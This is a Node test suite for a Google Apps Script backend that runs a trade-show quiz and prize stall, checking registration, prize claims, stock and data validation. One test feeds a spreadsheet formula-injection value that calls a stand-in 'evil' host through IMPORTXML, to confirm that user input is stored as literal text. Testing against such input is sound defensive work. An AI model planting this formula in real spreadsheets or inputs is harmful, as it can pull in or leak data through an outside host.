// Tests for google-apps-script-cphi.gs, run in Node against fake Sheets
// (see sheets-mock.mjs). Several of these pin down real bugs found on the
// live sheet, so a regression shows up here instead of at the stall.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { loadBackend } from './sheets-mock.mjs'

const visitor = {
  name: 'Asha Verma',
  phone: '+91 9876543210',
  email: 'asha@example.com',
  organization: 'Sun Pharma',
  designation: 'QA Manager',
}
const entryRows = (b) => b.sheets.CphiEntries.view().slice(1)
const COL = { ref: 1, status: 2, name: 3, email: 4, phone: 5, score: 6, prize: 9, org: 11, desig: 12 }

test('a full visit leaves exactly one row, with every field', () => {
  const b = loadBackend()
  assert.equal(b.post({ action: 'register', ...visitor }).ok, true)
  assert.equal(b.post({ action: 'claimGift', id: 'lamp', ...visitor }).ok, true)
  const done = b.post({ action: 'submit', ...visitor, score: 2, total: 3, percent: 67, gift: 'Desk Lamp', answers: [] })
  assert.equal(done.ok, true)

  const rows = entryRows(b)
  assert.equal(rows.length, 1, 'register -> claim -> submit should upgrade one row, not append three')
  const row = rows[0]
  assert.equal(row[COL.status], 'entered')
  assert.equal(row[COL.ref], done.ref)
  assert.equal(row[COL.prize], 'Desk Lamp')
  assert.equal(row[COL.org], 'Sun Pharma')
  assert.equal(row[COL.desig], 'QA Manager')
})

test('phone numbers are stored as digits, never as a broken "+91" formula', () => {
  const b = loadBackend()
  b.post({ action: 'register', ...visitor })
  const phone = entryRows(b)[0][COL.phone]
  assert.equal(phone, '919876543210')
  assert.notEqual(phone, '#ERROR!')
})

test('one prize per mobile: a second claim from the same number is refused', () => {
  const b = loadBackend()
  b.post({ action: 'register', ...visitor })
  assert.equal(b.post({ action: 'claimGift', id: 'pen', ...visitor }).ok, true)
  const again = b.post({ action: 'claimGift', id: 'lamp', ...visitor })
  assert.equal(again.ok, false)
  assert.equal(again.reason, 'alreadyclaimed')
  // ...and the same number typed differently is still the same person.
  assert.equal(b.get({ action: 'eligibility', phone: '9876543210' }).eligible, false)
})

test('claiming debits stock, and an out-of-stock prize cannot be claimed', () => {
  const b = loadBackend()
  assert.equal(b.post({ action: 'claimGift', id: 'lamp', ...visitor }).remaining, 1)
  assert.equal(b.sheets.Gifts.view()[1][7], '1')
  const sold = b.post({ action: 'claimGift', id: 'speaker', ...visitor, phone: '+91 9000000001' })
  assert.equal(sold.ok, false)
  assert.equal(sold.reason, 'outofstock')
})

test('email is optional: blank is accepted, no visitor mail is sent', () => {
  const b = loadBackend()
  const res = b.post({ action: 'submit', ...visitor, email: '', score: 1, total: 3, percent: 33, gift: 'Pen Set', answers: [] })
  assert.equal(res.ok, true)
  assert.equal(b.mail.filter((m) => m.to === '').length, 0, 'must not try to mail an empty address')
  assert.ok(b.logs.some((l) => /No email/.test(l)), 'skipping the mail should be logged')
})

test('a malformed email is still rejected, and organization/designation are required', () => {
  const b = loadBackend()
  const base = { action: 'submit', score: 1, total: 3, percent: 33, gift: 'Pen Set', answers: [] }
  assert.match(b.post({ ...base, ...visitor, email: 'not-an-email' }).error, /email/i)
  assert.match(b.post({ ...base, ...visitor, organization: '' }).error, /organization/i)
  assert.match(b.post({ ...base, ...visitor, designation: ' ' }).error, /designation/i)
})

test('a repeat submit re-sends the confirmation instead of going silent', () => {
  const b = loadBackend()
  const body = { action: 'submit', ...visitor, score: 2, total: 3, percent: 67, gift: 'Pen Set', answers: [] }
  const first = b.post(body)
  const second = b.post(body)
  assert.equal(second.alreadyEntered, true)
  assert.equal(second.ref, first.ref)
  assert.equal(b.mail.filter((m) => m.to === visitor.email).length, 2)
  assert.equal(entryRows(b).length, 1)
})

test('text typed by the public is never run as a formula', () => {
  const b = loadBackend()
  b.post({ action: 'register', ...visitor, organization: '=IMPORTXML("http://evil","//a")', designation: '+ QA Lead' })
  const row = entryRows(b)[0]
  assert.equal(row[COL.org], '=IMPORTXML("http://evil","//a")', 'stored as literal text')
  assert.equal(row[COL.desig], '+ QA Lead')
})

test('setupSheets on a header-less tab inserts the header ABOVE existing entries', () => {
  // The exact state of the live tab when it was found: made by hand, so the
  // first entry landed in row 1 and a second row was created for the same
  // visitor because row 1 was invisible to lookups.
  const b = loadBackend({
    entries: [
      ['19/11/2026 11:22', 'CP-NB7K2P', 'registered', 'Fgfgfg', 'p@x.com', '916728789812', '', '', '', '', '[]', 'jhgfd', 'dsg'],
      ['19/11/2026 11:22', 'CP-GP22CX', 'entered', 'Fgfgfg', 'p@x.com', '916728789812', '2', '3', '67', 'Mystery Gift', '[{}]', 'jhgfd', 'dsg'],
    ],
  })
  b.gs.setupSheets()
  const view = b.sheets.CphiEntries.view()
  assert.equal(view[0][0], 'Entered At')
  assert.equal(view[0][12], 'Designation')
  assert.deepEqual(view.slice(1).map((r) => r[1]), ['CP-NB7K2P', 'CP-GP22CX'], 'both entries kept, in order')

  b.gs.setupSheets() // must be safe to run again
  assert.equal(b.sheets.CphiEntries.view().length, 3, 'a second run adds nothing')
})

test('with duplicate rows, lookups use the furthest-progressed one', () => {
  const b = loadBackend({
    entries: [
      ['Entered At', 'Ref', 'Status', 'Name', 'Email', 'Phone'],
      ['t', 'CP-AAAAAA', 'registered', 'X', '', '916728789812', '', '', '', '', '[]'],
      ['t', 'CP-BBBBBB', 'entered', 'X', '', '916728789812', '2', '3', '67', 'Mystery Gift', '[]'],
    ],
  })
  const hit = b.gs.findEntry('', '+91 6728789812')
  assert.equal(hit.ref, 'CP-BBBBBB')
  assert.equal(b.get({ action: 'eligibility', phone: '6728789812' }).eligible, false, 'a winner must not be offered a second spin')
})

test('legacy rows holding a broken phone formula are still matched, and repairable', () => {
  // Written by the very first version of the script, before sheetPhone().
  const b = loadBackend({
    entries: [
      ['Entered At', 'Ref', 'Status', 'Name', 'Email', 'Phone'],
      ['t', 'CP-OLDOLD', 'prize-claimed', 'X', '', '+91 9000000004', '', '', '', 'Pen Set', '[]'],
    ],
  })
  assert.equal(b.sheets.CphiEntries.view()[1][COL.phone], '#ERROR!', 'mock reproduces the live bug')
  assert.equal(b.gs.findEntry('', '9000000004').ref, 'CP-OLDOLD')
  b.gs.repairEntryPhones()
  assert.equal(b.sheets.CphiEntries.view()[1][COL.phone], '919000000004')
})

test('the question bank skips malformed rows instead of serving them', () => {
  const b = loadBackend({
    questions: [
      ['id', 'question', 'option1', 'option2', 'option3', 'option4', 'answer'],
      ['good', 'Two plus two?', '3', '4', '5', '6', '1'],
      ['blank-option', 'Missing one?', 'a', '', 'c', 'd', '0'],
      ['bad-answer', 'Answer out of range?', 'a', 'b', 'c', 'd', '7'],
    ],
  })
  const res = b.get({ action: 'questions' })
  assert.equal(res.ok, true)
  assert.deepEqual(res.questions.map((q) => q.id), ['good'])
})

test('gifts are read in the shared tab\'s column order', () => {
  const g = loadBackend().get({ action: 'gifts' }).gifts
  assert.deepEqual(g.premium.map((x) => [x.id, x.emoji, x.stock, x.active]), [['lamp', '💡', 2, true]])
  assert.equal(g.superpremium[0].stock, 0)
})
